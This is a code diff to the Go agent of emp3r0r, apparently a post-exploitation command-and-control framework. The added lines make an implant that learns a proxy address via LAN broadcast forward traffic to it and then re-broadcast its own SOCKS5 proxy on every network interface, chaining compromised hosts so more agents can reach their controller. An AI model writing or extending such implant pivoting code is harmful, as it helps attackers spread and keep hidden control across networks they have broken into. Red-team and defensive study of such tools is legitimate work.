@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"strings"
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/tun"
@@ -44,6 +45,19 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc) (err error)
 		if tun.IsProxyOK(decMsg) {
 			AgentProxy = decMsg
 			log.Printf("BroadcastServer: %s set as AgentProxy\n", AgentProxy)
+
+			// pass the proxy to others
+			log.Printf("[+] BroadcastServer: %s will be served here too, let's hope it helps more agents\n", AgentProxy)
+			sl := strings.Split(AgentProxy, "//")
+			if len(sl) < 2 {
+				log.Printf("TCPFwd: invalid proxy addr: %s", AgentProxy)
+				continue
+			}
+			err = TCPFwd(sl[1], ProxyPort, ctx, cancel)
+			if err != nil {
+				log.Print("TCPFwd: ", err)
+			}
+			go StartBroadcast(ctx, cancel)
 		}
 	}
 	return
@@ -75,8 +89,8 @@ func BroadcastMsg(msg, dst string) (err error) {
 
 func StartBroadcast(ctx context.Context, cancel context.CancelFunc) {
 	// start a socks5 proxy
-	Socks5Proxy("on", "0.0.0.0:8388")
-	defer Socks5Proxy("off", "0.0.0.0:8388")
+	Socks5Proxy("on", "0.0.0.0:"+ProxyPort)
+	defer Socks5Proxy("off", "0.0.0.0:"+ProxyPort)
 
 	defer cancel()
 	proxyMsg := "socks5://127.0.0.1:1080"
@@ -87,7 +101,7 @@ func StartBroadcast(ctx context.Context, cancel context.CancelFunc) {
 			if ip.Broadcast == nil {
 				continue
 			}
-			proxyMsg = fmt.Sprintf("socks5://%s:8388", ip.IP.String())
+			proxyMsg = fmt.Sprintf("socks5://%s:%s", ip.IP.String(), ProxyPort)
 			err := BroadcastMsg(proxyMsg, ip.Broadcast.String())
 			if err != nil {
 				log.Print(err)
